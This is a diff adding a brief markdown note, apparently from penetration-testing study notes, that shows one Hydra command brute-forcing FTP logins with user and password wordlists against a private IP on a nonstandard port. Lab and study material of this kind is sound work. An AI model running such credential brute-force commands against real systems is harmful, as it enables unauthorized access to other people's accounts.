@@ -1,1 +1,5 @@
+#Hydra 
+
+Attacking un Common ports
+hydra -L /root/Desktop/wordlists/ftp_Users.txt -P /root/Desktop/wordlists/unix_passwords.txt ftp://192.253.124.3:5554
 
